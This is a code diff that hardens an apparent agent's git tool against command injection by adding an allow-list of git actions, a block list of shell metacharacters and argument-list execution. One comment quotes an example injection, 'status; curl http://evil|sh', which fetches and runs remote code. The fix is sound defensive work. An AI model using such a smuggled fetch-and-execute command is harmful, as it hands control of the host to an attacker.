@@ -874,14 +874,52 @@ class GitTool(BaseTool):
         args = kwargs.get("args", "")
         cwd = kwargs.get("cwd", None)
 
-        cmd = f"git {action}"
+        # 安全检查：验证 git action 是否合法
+        allowed_actions = {
+            "status", "log", "diff", "show", "branch", "tag",
+            "remote", "stash", "blame", "grep", "ls-files",
+            "ls-remote", "ls-tree", "cat-file", "rev-parse",
+            "describe", "shortlog", "whatchanged", "verify-pack",
+        }
+        if action not in allowed_actions:
+            return ToolResult(
+                call_id="",
+                tool_name=self.name,
+                success=False,
+                output="",
+                error=f"不允许的 git 操作: {action}。允许的操作: {', '.join(sorted(allowed_actions))}",
+            )
+
+        # 安全检查：验证 args 不包含危险字符
+        # 防止命令注入，如 args="status; curl http://evil|sh"
+        dangerous_chars = [';', '|', '&', '$', '`', '(', ')', '{', '}', '>', '<', '\n', '\r']
+        for char in dangerous_chars:
+            if char in args:
+                return ToolResult(
+                    call_id="",
+                    tool_name=self.name,
+                    success=False,
+                    output="",
+                    error=f"参数包含危险字符: {char}。禁止使用 shell 元字符。",
+                )
+
+        # 使用列表形式执行，避免 shell 注入
+        cmd_parts = ["git", action]
         if args:
-            cmd += f" {args}"
+            # 安全地分割参数
+            try:
+                import shlex
+                cmd_parts.extend(shlex.split(args))
+            except ValueError:
+                # shlex 解析失败，使用简单分割
+                cmd_parts.extend(args.split())
 
-        logger.info(f"[git] 执行: {cmd}")
+        logger.info(f"[git] 执行: {' '.join(cmd_parts)}")
 
-        proc = await asyncio.create_subprocess_shell(
-            cmd,
+        # 使用 create_subprocess_exec 而不是 create_subprocess_shell
+        # 避免 shell 注入风险
+        proc = await asyncio.create_subprocess_exec(
+            *cmd_parts,
             cwd=cwd,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
